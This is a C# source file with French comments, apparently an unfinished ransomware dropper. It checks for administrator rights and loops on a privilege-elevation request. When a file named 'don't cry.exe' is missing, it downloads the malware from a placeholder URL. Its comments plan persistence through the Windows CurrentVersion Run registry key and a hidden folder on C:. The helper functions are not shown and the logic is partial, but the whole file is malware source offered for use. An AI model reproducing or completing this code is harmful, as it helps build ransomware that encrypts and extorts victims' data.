using System;
using System.IO;
using System.Net.Http;
using Lfd;
using System.Security.Principal;


class Program{

    static void Main(){
        // faire une fonction  pour demander les droit admin sinon on ne run pas 
        
        bool IsAdmin = MalwaireFunction.IsRoot();
        bool MalwaireFile = MalwaireFunction.fileExiste("don't cry.exe");// nom du virue ransomwaire
        bool MusicFile = MalwaireFunction.fileExiste("p.wav");// nom de la musique pour le virus 
        bool isDirectory = MalwaireFunction.DirectoryExistE("./bin");

        GotIS://label
        if(IsAdmin == true){
            // effectuer les tache l'utilisateur et root 

            
            /*
                1 - vérifier si le dossier WindowsRTT et dans le disque C:/
                2 - Si l'étape 1 et validé et que il y a bien le dossier alor on vérifi si dans le dossier il y a les fichier du virus si il y sont on run le virus si il n'y sont pas alor on télécharge le virus 
                3 - Si l'étape 1 et validé et que il a du cree le dossier car il ne l'été pas alors on vérifi si les fichier du virus sont télécharger et si non on les mov dans le repertoir sinon si oui on les mov dans le repertoir
                4 - avant de run le virus il faut vérifier si dans la cle de registre : Ordinateur\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run il y a pas deja le virus si non alor on le rajoute et on dit dans quelle repertoir il ce trouve
            */
            /*
            Cree un dossier  documentation
            https://learn.microsoft.com/fr-fr/dotnet/api/system.io.directory.createdirectory?view=net-8.0
            */

            if(isDirectory == true){
                Console.WriteLine("Le fichier existe");

            }else{
                Console.WriteLine("Error");
            }

            if(MalwaireFile == true){
                Console.WriteLine("Le logiciel et bien sur le repertoir");
                Console.ReadLine();
            }else{
                MalwaireFunction.donload("https://githubdddd", "don't cry.exe"); // télécharger le malwaire sur le repertoir actuelle

            }

        }else{
            // demander elavation 
            MalwaireFunction.ElevatROOT(IsAdmin);
            goto GotIS;// allez au label une fois l'elevation de privilège terminer refaire 
            // la condition pour voir si on et admin ou pas

        }
        
    }



};




